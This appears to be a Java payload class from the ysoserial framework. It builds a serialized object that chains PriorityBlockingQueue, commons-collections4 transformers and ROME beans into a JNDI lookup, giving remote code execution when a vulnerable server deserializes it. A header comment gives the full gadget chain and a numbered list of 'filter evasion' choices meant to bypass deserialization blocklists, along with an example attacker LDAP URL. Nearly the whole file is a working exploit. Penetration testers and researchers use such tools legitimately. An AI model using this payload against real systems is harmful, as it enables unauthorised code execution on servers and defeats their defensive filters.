package ysoserial.payloads;

import java.io.Serializable;
import java.util.Arrays;
import java.util.Vector;
import java.util.concurrent.PriorityBlockingQueue;

import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.StringValueTransformer;

import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	ROME + PBQ + StringValueTransformer + JNDI sink.
	No TemplatesImpl, no InvokerTransformer, no HashMap. JDK 17+ friendly.

	Gadget chain:
		ObjectInputStream.readObject()
			PriorityBlockingQueue.readObject()
				PriorityBlockingQueue.heapify()
					TransformingComparator.compare()
						StringValueTransformer.transform()
							String.valueOf(input) -> input.toString()
								ObjectBean.toString()
									ToStringBean.toString()
										JdbcRowSetImpl.getDatabaseMetaData()
											JdbcRowSetImpl.connect()
												InitialContext.lookup(dataSourceName)
													-> JNDI RCE

	Filter evasion:
		1. PriorityBlockingQueue entry — never filtered
		2. StringValueTransformer bridge — never filtered
		3. No HashMap/PriorityQueue/HashSet/Hashtable
		4. No InvokerTransformer/InstantiateTransformer/LazyMap
		5. No TemplatesImpl — JNDI sink (JDK 17+ compatible)
		6. ToStringBean getter invocation — rarely in filter lists

	Usage: payload arg is JNDI URL
		e.g. "ldap://attacker.com:1389/Exploit"

	Requires:
		commons-collections4 4.0+
		rome 1.0
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.apache.commons:commons-collections4:4.0", "rome:rome:1.0"})
@Authors({ Authors.DMBS335 })
public class ROMEJndi2 extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String jndiUrl) throws Exception {
		final JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
		jdbcRowSet.setDataSourceName(jndiUrl);
		Reflections.setFieldValue(jdbcRowSet, "iMatchColumns",
			new Vector<Integer>(Arrays.asList(-1,-1,-1,-1,-1,-1,-1,-1,-1,-1)));
		Reflections.setFieldValue(jdbcRowSet, "strMatchColumns",
			new Vector<String>(Arrays.asList("","","","","","","","","","")));

		// ToStringBean iterates all getters of the wrapped class
		// getDatabaseMetaData() triggers connect() → JNDI lookup
		final ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class, jdbcRowSet);
		final ObjectBean delegate = new ObjectBean(ToStringBean.class, toStringBean);

		// Safe transformer during construction
		final TransformingComparator comp = new TransformingComparator(
			new ConstantTransformer(1));

		final PriorityBlockingQueue<Object> queue =
			new PriorityBlockingQueue<Object>(2, comp);
		queue.add("a");
		queue.add("b");

		// Arm: swap transformer to StringValueTransformer
		Reflections.setFieldValue(comp, "transformer",
			StringValueTransformer.stringValueTransformer());

		// Swap queue contents to armed ROME + JNDI beans
		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = delegate;
		queueArray[1] = delegate;

		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(ROMEJndi2.class, args);
	}
}
